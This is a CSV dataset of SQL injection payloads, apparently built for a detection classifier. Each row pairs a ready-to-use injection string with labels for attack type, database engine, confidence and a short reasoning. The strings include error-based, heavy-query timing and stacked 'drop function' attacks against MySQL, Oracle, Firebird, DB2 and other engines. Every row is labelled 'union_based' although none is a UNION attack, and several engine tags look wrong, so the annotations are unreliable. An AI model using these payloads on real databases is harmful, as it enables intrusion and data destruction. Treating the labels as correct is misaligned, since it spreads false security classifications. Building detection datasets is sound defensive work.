id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18375,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""nzgn"" = ""nzgn",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18382,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'yvzf' = 'yvzf",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18387,-9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
18390,"1 ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 4510 = 4510",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18392,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zenl' like 'zenl",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
18393,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""mmsh"" = ""mmsh",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18207,"1"" ) where 2136 = 2136 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18210,"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18223,1'|| ( select 'uiyj' from dual where 8320 = 8320,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18226,"1 ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18228,1'|| ( select 'zyvk' from dual where 2072 = 2072,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18232,1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18234,"1'+ ( select 'zohk' where 5502 = 5502 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18260,"1%' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18269,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18276,"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18287,"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18294,-7199'|| ( select 'ssty' where 5406 = 5406 order by 1#,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
18296,1'|| ( select 'noik' from dual where 9851 = 9851,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18303,if ( 3831 = 9321 ) select 3831 else drop function ybru--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
18304,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
18317,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
18334,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18336,1'|| ( select 'omeg' from dual where 4751 = 4751,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18340,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18341,1'|| ( select 'gved' from dual where 6965 = 6965,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18346,"1 ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 5468 = 5468",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18367,if ( 8537 = 7034 ) select 8537 else drop function vqmp--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
18370,-4607'|| ( select 'wkdg' where 7524 = 7524 order by 1--,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,0
18372,"1'|| ( select 'ymez' from dual where 9870 = 9870 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18383,1'|| ( select 'goen' from dual where 8586 = 8586,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
18384,if ( 5896 = 4251 ) select 5896 else drop function xmyk--,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,0
18389,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18399,"1%"" ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",union_based,firebird,0.9,Signals: 'rdb'; UNION-based payload detected; DB: firebird,0
18203,"1' in boolean mode ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 131 chars.,0
18213,"1 ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 8814 = 8814",union_based,generic,0.7,UNION-based payload detected. Payload length: 129 chars.,0
18216,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,0
18217,1'+ ( select 'ljtl' where 1766 = 1766,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
18221,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'rhzy' = 'rhzy",union_based,generic,0.7,UNION-based payload detected. Payload length: 178 chars.,0
18222,"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 150 chars.,0
18227,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",union_based,generic,0.7,UNION-based payload detected. Payload length: 132 chars.,0
18231,"1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 129 chars.,0
18233,"1%"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 131 chars.,0
18238,"1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 179 chars.,0
18250,"1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 122 chars.,0
18256,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""pfea"" = ""pfea",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 133 chars.,0
18265,1'+ ( select 'cwta' where 6091 = 6091,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
18272,"1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,union_based,generic,0.7,UNION-based payload detected. Payload length: 115 chars.,0
18273,"1' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 117 chars.,0
18279,"1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 106 chars.,0
18280,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432",union_based,generic,0.7,UNION-based payload detected. Payload length: 110 chars.,0
18283,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",union_based,generic,0.7,UNION-based payload detected. Payload length: 137 chars.,0
18284,"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 133 chars.,0
18285,1'|| ( select 'jmao' where 3009 = 3009,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
18286,"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 125 chars.,0
18288,"1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 111 chars.,0
18289,1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,0
18292,"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",union_based,generic,0.7,UNION-based payload detected. Payload length: 137 chars.,0
18299,"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 140 chars.,0
18300,"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 143 chars.,0
18301,"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 105 chars.,0
18305,"1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",union_based,generic,0.7,UNION-based payload detected. Payload length: 106 chars.,0
18306,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 99 chars.,0
18310,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",union_based,generic,0.7,UNION-based payload detected. Payload length: 111 chars.,0
18312,"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 136 chars.,0
18315,1'|| ( select 'fwph' where 3791 = 3791,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
18318,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",union_based,generic,0.7,UNION-based payload detected. Payload length: 184 chars.,0
18320,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",union_based,generic,0.7,UNION-based payload detected. Payload length: 133 chars.,0
18322,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,0
18324,"1%' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 113 chars.,0
18326,"1"" where 2365 = 2365 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 131 chars.,0
18338,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 190 chars.,0
18339,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 135 chars.,0
18345,"1 where 5929 = 5929 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 125 chars.,0
18349,1'+ ( select qdon where 9453 = 9453,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
18352,"1%"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 164 chars.,0
18354,"1%"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,union_based,generic,0.7,UNION-based payload detected. Payload length: 131 chars.,0
18360,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'zpzf' = 'zpzf",union_based,generic,0.7,UNION-based payload detected. Payload length: 183 chars.,0
18362,"1'|| ( select 'qsgi' where 1707 = 1707 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",union_based,generic,0.7,UNION-based payload detected. Payload length: 144 chars.,0
18364,"1%' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and '%' = '",union_based,generic,0.7,UNION-based payload detected. Payload length: 173 chars.,0
18366,1'+ ( select ohqr where 5610 = 5610,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
18368,"1"" ) as zhlf where 4119 = 4119 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 136 chars.,0
18369,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'ofko' = 'ofko",union_based,generic,0.7,UNION-based payload detected. Payload length: 134 chars.,0
18371,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'vgkt' = 'vgkt",union_based,generic,0.7,UNION-based payload detected. Payload length: 126 chars.,0
18376,"1%"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 112 chars.,0
18377,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( '%' = '",union_based,generic,0.7,UNION-based payload detected. Payload length: 102 chars.,0
18379,"1%"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 115 chars.,0
18385,"1%"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,union_based,generic,0.7,UNION-based payload detected. Payload length: 124 chars.,0
18386,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'xdui' like 'xdui",union_based,generic,0.7,UNION-based payload detected. Payload length: 139 chars.,0
18388,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""gxqq"" = ""gxqq",union_based,generic,0.7,UNION-based payload detected. Payload length: 130 chars.,0
18394,1'+ ( select 'feof' where 1966 = 1966,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
